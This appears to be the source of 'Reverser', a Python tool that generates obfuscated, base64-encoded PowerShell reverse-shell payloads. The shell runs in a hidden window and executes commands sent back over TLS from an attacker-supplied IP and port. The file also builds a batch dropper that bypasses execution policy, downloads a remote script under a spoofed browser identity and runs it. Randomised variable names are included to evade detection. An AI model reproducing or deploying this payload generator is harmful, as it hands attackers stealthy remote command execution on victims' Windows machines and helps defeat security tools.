import os
import subprocess
import argparse
import random
import base64
from urllib.parse import urlparse
from colorama import Fore, Style, init


init()

def print_banner():
    banner = f"""{Fore.RED}
 ____                                   
|  _ \ _____   _____ _ __ ___  ___ _ __ 
| |_) / _ \ \ / / _ \ '__/ __|/ _ \ '__|
|  _ <  __/\ V /  __/ |  \__ \  __/ |   
|_| \_\___| \_/ \___|_|  |___/\___|_|   

@ShkudW
{Style.RESET_ALL}"""
    print(banner)
    print(f"{Fore.CYAN}GitHub: https://github.com/ShkudW/Reverser{Style.RESET_ALL}")

def generate_certificate(cert_file, key_file):
    try:
        print(f"{Fore.YELLOW}Generating certificate...{Style.RESET_ALL}")
        process = subprocess.Popen([
            "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
            "-x509", "-subj", "/CN=www.reception.recep",
            "-keyout", key_file, "-out", cert_file
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for line in iter(process.stdout.readline, b''):
            colored_line = ''.join(random.choice([
                Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN
            ]) + chr(c) for c in line)
            print(colored_line, end='')
        
        process.stdout.close()
        process.wait()
        print(f"\n{Fore.GREEN}Certificate and key generated and saved to {cert_file} and {key_file}{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred during certificate creation: {e}")
        raise

def obfuscate_using_bank():
    bank = {
        "c1i3nt": random.choice([
            "$c1i3nt", "$CLiEn7", "$C1Li3n7", "$client", "$Cli3nt", "$cLiEnT",
            "$userCon", "$socketC", "$netCl", "$nc", "$tcpC", "$con"
        ]),
        "str3am": random.choice([
            "$str3am", "$StrE4m", "$sTR3Am", "$stream", "$stre4m", "$sTrEAm",
            "$dataStr", "$ds", "$netStr", "$dataStream", "$dStream", "$nStream"
        ]),
        "ss1Str3am": random.choice([
            "$ss1Str3am", "$SSlStr3Am", "$SsLStre4M", "$sslStream", "$sStr3am",
            "$sslStr", "$secStream", "$secStrm", "$sStrm", "$secureStream", "$sslStrm"
        ]),
        "r3ad3r": random.choice([
            "$r3ad3r", "$Re4d3R", "$rEAd3r", "$reader", "$re4d3r", "$rEaDeR",
            "$dataRdr", "$dr", "$txtReader", "$streamRdr", "$rdr", "$dReader"
        ]),
        "wr1t3r": random.choice([
            "$wr1t3r", "$WrIT3r", "$wRiT3r", "$writer", "$wriT3r", "$wRiTeR",
            "$dataWrt", "$dw", "$txtWriter", "$streamWrt", "$wrt", "$dWriter"
        ])
    }
    return bank

def generate_encoded_obfuscated_ps1(ip, port):
    replacements = obfuscate_using_bank()

    ps1_content = f"""powershell.exe -WindowStyle Hidden -Command
$dummyVar = {random.randint(1000, 9999)} * {random.randint(1000, 9999)}
function CustomRead-Stream {{
    param($stream)
    return New-Object System.IO.StreamReader($stream)
}}
$encodedIP = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("{ip}"))
$decodedIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedIP))
{replacements['c1i3nt']} = New-Object System.Net.Sockets.TCPClient($decodedIP,{port});
{replacements['str3am']} = {replacements['c1i3nt']}.GetStream();
{replacements['ss1Str3am']} = New-Object System.Net.Security.SslStream({replacements['str3am']}, $false,
    {{
        param (
            $sender,
            [System.Security.Cryptography.X509Certificates.X509Certificate]$cert,
            [System.Security.Cryptography.X509Certificates.X509Chain]$chain,
            [System.Net.Security.SslPolicyErrors]$sslPolicyErrors
        )
        return $true;
    }}, $null);
{replacements['ss1Str3am']}.AuthenticateAsClient($decodedIP, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);
{replacements['r3ad3r']} = CustomRead-Stream({replacements['ss1Str3am']});
{replacements['wr1t3r']} = New-Object System.IO.StreamWriter({replacements['ss1Str3am']});
{replacements['wr1t3r']}.AutoFlush = $true;
{replacements['wr1t3r']}.WriteLine("Connection established successfully.");
while($true) {{
    $command = {replacements['r3ad3r']}.ReadLine();
    if ($command -eq "exit") {{ break; }}
    $currentDir = (Get-Location).Path + "> ";
    $output = $currentDir + (Invoke-Expression $command | Out-String);
    {replacements['wr1t3r']}.WriteLine($output);
    {replacements['wr1t3r']}.Flush();
}}
{replacements['ss1Str3am']}.Close();
{replacements['c1i3nt']}.Close();
    """

    encoded_command = base64.b64encode(ps1_content.encode('utf-8')).decode('utf-8')
    ps1_script = f"""
$encodedCommand = "{encoded_command}"
$decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
    """
    return ps1_script

def save_encoded_ps1(ip, port, output_file):
    ps1_script = generate_encoded_obfuscated_ps1(ip, port)
    with open(output_file, 'w') as file:
        file.write(ps1_script.strip())
    print(f"{Fore.GREEN}Base64 encoded PowerShell script saved to {output_file}{Style.RESET_ALL}")

def generate_bat_with_encoded_ps1(server_url, output_file):
    bat_content = f"""
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; 
$wc = New-Object System.Net.WebClient; 
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); 
$wc.Headers.Add('Referer','https://www.bing.com'); 
$wc.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'); 
$wc.Headers.Add('Cookie', 'sessionid=bM2Bhj6QixtA4n9GcFB4Ne5o4MiQEmHvKVFB6v0vHPoIIHAvIh'); 
$ps1 = $wc.DownloadString('{server_url}'); 
Invoke-Expression $ps1;
    """
    # Encode the PowerShell command to Base64
    encoded_command = base64.b64encode(bat_content.encode('utf-16le')).decode('utf-8')
    
    bat_script = f"""
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -encodedCommand {encoded_command}
    """

    with open(output_file, 'w') as file:
        file.write(bat_script.strip())
    
    print(f"{Fore.GREEN}Encoded batch script saved to {output_file}{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Generate a reverse shell with SSL encryption.")
    parser.add_argument("-ip", type=str, required=True, help="IP address for the reverse shell")
    parser.add_argument("-port", type=int, required=True, help="Port for the reverse shell")
    parser.add_argument("-type", type=str, choices=["ps1", "bat"], required=True, help="Type of payload to generate (ps1/bat)")
    parser.add_argument("-server", type=str, help="Server URL to download PS1 script from (for BAT file)")

    args = parser.parse_args()

    if args.type == "bat" and not args.server:
        print(f"{Fore.RED}Error: Server URL is required for BAT file generation.{Style.RESET_ALL}")
        exit(1)

    cert_file = "reception.pem"
    key_file = "reception.key"

    generate_certificate(cert_file, key_file)

    if args.type == "ps1":
        output_file = "reception.ps1"
        save_encoded_ps1(args.ip, args.port, output_file)
    elif args.type == "bat":
        # Extract the PS1 filename from the server URL
        ps1_filename = os.path.basename(urlparse(args.server).path)

        # Save the PS1 file first
        save_encoded_ps1(args.ip, args.port, ps1_filename)
        
        # Generate the BAT file with the encoded content
        output_file = "reception.bat"
        generate_bat_with_encoded_ps1(args.server, output_file)

    print(f"{Fore.CYAN}To start an OpenSSL listener, run:\n{Fore.GREEN}openssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet{Style.RESET_ALL}")
